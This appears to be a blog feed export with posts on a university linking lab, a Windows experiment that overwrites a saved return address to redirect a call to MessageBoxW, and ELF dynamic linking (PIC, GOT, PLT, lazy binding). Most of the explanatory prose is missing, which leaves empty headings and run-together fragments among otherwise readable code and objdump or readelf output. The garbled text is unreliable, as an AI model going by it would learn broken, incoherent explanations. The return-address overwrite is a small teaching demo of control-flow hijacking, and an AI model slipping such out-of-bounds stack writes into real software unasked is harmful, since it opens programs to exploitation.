class="number">5</span>c &lt;transform_code+<span class="number">0x4</span>&gt;<span class="comment">//__x86.get_pc_thunk.ax</span></span><br><span class="line"><span class="number">60</span>:    <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       add    $<span class="number">0x1</span>,%eax</span><br></pre></td></tr></table></figure><p>got,00000007  00001902 R_386_PC32        00000000   __x86.get_pc_thunk.ax</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure><p>switch case</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">90</span>:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br><span class="line">a6:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br><span class="line">cd:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">92</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">CF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x9e0</span> contains <span class="number">35</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000119</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">0000011f</span>  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">00000067</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000083</span>  <span class="number">00000509</span> R_386_GOTOFF      <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000133</span>  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000000</span>c  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000b</span>b  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000061</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>3  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000113</span>  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000092</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>a8  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cf  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000141</span>  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000058</span>   transform_code</span><br><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000016</span>c  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000172</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">0000017</span>d  <span class="number">00002404</span> R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001</span>a0  <span class="number">0000222b</span> R_386_GOT32X      <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>aa  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase6.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">a*aTTgg-K</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/"/>
      <url>/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><a href="https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/">https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/</a> lnnkscode</p><p>vs2022  x86 Release</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    show(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>showar[3]pf(pushcall)pfmainpfar[3]showmessageboxmainmainretcrash</p><p><img src="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/image-20230506154546803.png" alt="image-20230506154546803"></p><p>?</p><p>messageboxwinapiWindows API__stdcallret 10hshowC&#x2F;C++_cdecl,main add   esp,14hshowret 10hret10h pop eipadd esp10h 20</p><p>show55</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">     push <span class="number">666</span> </span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//int ar[5]=&#123;0&#125;;</span></span><br><span class="line">    show(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>,</p><p>push5showpushpush</p><p>showmainaddadd</p><p><img src="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/image-20230506152018853.png" alt="image-20230506152018853"></p><p>ar[4]+&#x3D;3;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    (show)(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>showcdeclstacallshowstdcall</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span>  <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(_stdcall* pf)</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    ((pf)show)(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF(ELF Dynamical link)</title>
      <link href="/2023/05/04/ELF-Dynamical-link/"/>
      <url>/2023/05/04/ELF-Dynamical-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Dynamical-link"><a href="#ELF-Dynamical-link" class="headerlink" title="ELF Dynamical link"></a>ELF Dynamical link</h1><p></p><ul><li><p></p></li><li><p></p></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>:</p><blockquote><p>printflibc.aprintf.oprintfhh</p></blockquote><p>.so</p><p>so&#x3D;+</p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -share -o xx.so x.c </span><br></pre></td></tr></table></figure><h3 id="share"><a href="#share" class="headerlink" title="-share"></a>-share</h3><p>-share</p><p></p><blockquote><p>pieelf headee_typeET_DYNET_EXEC</p><p><a href="https://grxer.github.io/2023/03/19/23-2-21-elf/">https://grxer.github.io/2023/03/19/23-2-21-elf/</a></p><p>pie</p></blockquote><p>-share-fpic </p><h3 id="fPIC"><a href="#fPIC" class="headerlink" title="-fPIC"></a>-fPIC</h3><p>-fPIC(Postive Independent Code, PIC)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span>&#123;</span><br><span class="line">    a=<span class="number">1</span>;</span><br><span class="line">    b=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; gcc -m32 -fPIC -shared -o xxx.so test.c</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; file xxx.so</span><br><span class="line">xxx.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=9a4e584b71c83ff881f77f68b5483d63929ca339, not stripped</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; checksec xxx.so</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/link-load-library-code/chapter7/xxx.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="gt-gt-gt-"><a href="#gt-gt-gt-" class="headerlink" title="&gt;&gt;&gt; "></a><strong>&gt;&gt;&gt; </strong></h4><p>foobar()</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">000003f0 &lt;bar@plt&gt;:</span><br><span class="line">3f0:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)</span><br><span class="line">3f6:   68 00 00 00 00          push   $0x0</span><br><span class="line">3fb:   e9 e0 ff ff ff          jmp    3e0 &lt;_init+0x30&gt;</span><br><span class="line">00000576 &lt;foo&gt;:</span><br><span class="line">588:   e8 63 fe ff ff          call   3f0 &lt;bar@plt&gt;</span><br><span class="line">58d:   e8 6e fe ff ff          call   400 &lt;ext@plt&gt;</span><br><span class="line">592:   90                      nop</span><br></pre></td></tr></table></figure><p> 0x58d-0x19d(fffffe63)&#x3D;0x3f0pltplt</p><blockquote><p>pltgotpltgot()</p><p>gotPIC</p></blockquote><h4 id="gt-gt-gt-"><a href="#gt-gt-gt-" class="headerlink" title="&gt;&gt;&gt;"></a><strong>&gt;&gt;&gt;</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">550</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">551</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">553</span>:   e8 <span class="number">41</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">599</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> <span class="number">558</span>:   <span class="number">05</span> a8 <span class="number">1</span>a <span class="number">00</span> <span class="number">00</span>          add    $<span class="number">0x1aa8</span>,%eax</span><br><span class="line">   a=<span class="number">1</span>;</span><br><span class="line"> <span class="number">55</span>d:   c7 <span class="number">80</span> <span class="number">1</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span>    movl   $<span class="number">0x1</span>,<span class="number">0x1c</span>(%eax)</span><br><span class="line"> <span class="number">564</span>:   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p></p><p><code> 553:   e8 41 00 00 00      call   599 &lt;__x86.get_pc_thunk.ax&gt;</code>0x558+0x41&#x3D;0x599</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000599</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line"> <span class="number">599</span>:   <span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>                mov    (%esp),%eax</span><br><span class="line"> <span class="number">59</span>c:   c3                      ret</span><br></pre></td></tr></table></figure><p>call0x5580x558eaxeax</p><p><code>add    $0x1aa8,%eax</code>eax&#x3D;0x1aa8+0x558&#x3D;0x2000</p><p><code> 55d:   c7 80 1c 00 00 00 01    movl   $0x1,0x1c(%eax)</code></p><p>0x20000x1c 0x201c?</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -S  xxx.so</span><br><span class="line">There are <span class="number">33</span> section headers, starting at offset <span class="number">0x1964</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[<span class="number">23</span>] .bss              NOBITS          <span class="number">00002018</span> <span class="number">001018</span> <span class="number">000008</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -s  xxx.so</span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">67</span> entries:</span><br><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">40</span>: <span class="number">0000201</span>c     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">23</span> a</span><br></pre></td></tr></table></figure><p>.bssa</p><h4 id="gt-gt-gt-"><a href="#gt-gt-gt-" class="headerlink" title="&gt;&gt;&gt;"></a><strong>&gt;&gt;&gt;</strong></h4><p><strong></strong>(Global Offset Table, GOT)(pwn)</p><p>GOT.rel.data,.rel.dyn</p><p>got</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -S  xxx.so</span><br><span class="line">There are 33 section headers, starting at offset 0x1964:</span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[20] .got              PROGBITS        00001fe8 000fe8 000018 04  WA  0   0  4</span><br><span class="line"></span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -r  xxx.so</span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x358 contains 9 entries:</span><br><span class="line">Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00001fec  00000206 R_386_GLOB_DAT    00000000   b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void bar()&#123;</span><br><span class="line"> 550:   55                      push   %ebp</span><br><span class="line"> 551:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 553:   e8 41 00 00 00          call   599 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> 558:   05 a8 1a 00 00          add    $0x1aa8,%eax</span><br><span class="line">    a=1;</span><br><span class="line"> 55d:   c7 80 1c 00 00 00 01    movl   $0x1,0x1c(%eax)</span><br><span class="line"> 564:   00 00 00</span><br><span class="line">    b=2;</span><br><span class="line"> 567:   8b 80 ec ff ff ff       mov    -0x14(%eax),%eax</span><br><span class="line"> 56d:   c7 00 02 00 00 00       movl   $0x2,(%eax)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>goteax0x2000-0x140x1FEC bgot</p><blockquote><p>pccall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000357:e8 00 00 00 00    call 00035c</span><br><span class="line">00035c:5b                 popl %ebx</span><br></pre></td></tr></table></figure><p>call getpcret</p><p>64rip,32eip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001139 &lt;bar&gt;:</span><br><span class="line">    1139:       f3 0f 1e fa             endbr64</span><br><span class="line">    113d:       55                      push   %rbp</span><br><span class="line">    113e:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1141:       c7 05 e9 2e 00 00 01    movl   $0x1,0x2ee9(%rip)        # 4034 &lt;a&gt;</span><br><span class="line">    1148:       00 00 00</span><br><span class="line">    114b:       48 8b 05 86 2e 00 00    mov    0x2e86(%rip),%rax        # 3fd8 &lt;b&gt;</span><br><span class="line">    1152:       c7 00 02 00 00 00       movl   $0x2,(%rax)</span><br><span class="line">    1158:       90                      nop</span><br><span class="line">    1159:       5d                      pop    %rbp</span><br><span class="line">    115a:       c3                      ret</span><br></pre></td></tr></table></figure></blockquote><h4 id="gt-gt-gt-"><a href="#gt-gt-gt-" class="headerlink" title="&gt;&gt;&gt;"></a><strong>&gt;&gt;&gt;</strong></h4><p>gotELFgot.got.got.plt .got.got.plt</p><p>.rel.text.rel.plt</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[21] .got.plt          PROGBITS        00002000 001000 000014 04  WA  0   0  4</span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x3c0 contains 2 entries:</span><br><span class="line">Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00002010  00000507 R_386_JUMP_SLOT   00000000   ext</span><br></pre></td></tr></table></figure><p>got(lazy binding)got(Procedure Linkage Table, PLT[]got[]</p><p>got.plt</p><ul><li>.dynamic</li><li> link_map</li><li> _dl_runtime_resolve</li></ul><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><blockquote><p>.dynamic</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword    d_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506083401085.png" alt="image-20230506083401085"></p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -d  xxx.so</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf04 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x3d0</span><br><span class="line"> 0x0000000d (FINI)                       0x5cc</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x1ef8</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x1efc</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x138</span><br><span class="line"> 0x00000005 (STRTAB)                     0x27c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x17c</span><br><span class="line"> 0x0000000a (STRSZ)                      179 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x2000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   16 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x3c0</span><br><span class="line"> 0x00000011 (REL)                        0x370</span><br><span class="line"> 0x00000012 (RELSZ)                      80 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x350</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x330</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   3</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></blockquote><p>.rel.plt16</p><ul><li><ul><li>pushq *GOT[1];jmpq *GOT[2]</li><li></li></ul></li><li>__libc_start_main</li></ul><p>jmp *got[id]; push id;jump plt[0];16</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506013722990.png" alt="image-20230506013722990"></p><ol><li>plt</li><li>pltgotGOTPLTplt</li><li>idplt[0]</li><li>plt[0]got[1]gotp[2]got</li><li>plt</li></ol><p>hello worldprintflazy binding</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014213830.png" 